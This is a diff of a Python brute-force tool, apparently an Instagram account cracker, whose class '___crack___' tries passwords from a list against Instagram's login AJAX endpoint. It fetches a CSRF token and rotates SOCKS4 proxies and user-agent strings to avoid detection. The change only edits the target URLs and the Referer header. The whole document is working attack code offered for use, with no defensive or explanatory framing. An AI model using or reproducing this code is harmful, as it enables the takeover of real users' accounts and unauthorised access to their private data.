@@ -425,8 +425,8 @@ class ___crack___:
         try:
             for pw in pwx:
                 pw = pw.lower()
-                ___url = ('https://z-p42.www.instagram.com/')
-                ___login = ('https://z-p42.www.instagram.com/accounts/login/ajax/')
+                ___url = ('https://www.instagram.com/')
+                ___login = ('https://www.instagram.com/accounts/login/ajax/')
                 ___proxy = {'http': 'socks4://%s'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
                 ___csrf = requests.get(___url).cookies['csrftoken']
                 ___data = {'username': uid,
@@ -435,7 +435,7 @@ class ___crack___:
                 'optIntoOneTap': 'false'}
                 ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
                 'X-Requested-With': 'XMLHttpRequest',
-                'Referer': 'https://www.instagram.com/accounts/login/',
+                'Referer': 'https://api.instagram.com/accounts/login/',
                 'x-csrftoken': ___csrf}
                 with requests.Session() as ses:
                     response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
